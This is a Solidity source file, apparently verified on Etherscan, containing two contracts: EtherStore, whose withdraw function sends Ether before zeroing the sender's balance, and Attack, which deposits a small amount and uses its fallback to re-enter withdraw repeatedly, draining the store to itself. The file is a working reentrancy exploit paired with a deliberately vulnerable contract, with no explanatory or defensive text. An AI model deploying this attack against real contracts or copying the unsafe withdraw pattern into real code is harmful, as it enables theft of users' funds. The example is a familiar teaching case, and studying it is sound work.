/**
 *Submitted for verification at Etherscan.io on 2022-04-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable { 
       balances[msg.sender] += msg.value;
    }
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 0.01 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 0.01 ether);
        etherStore.deposit{value: 0.01 ether}();
        etherStore.withdraw();
    }

    function withdraw() public {
        uint bal = address(this).balance;
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}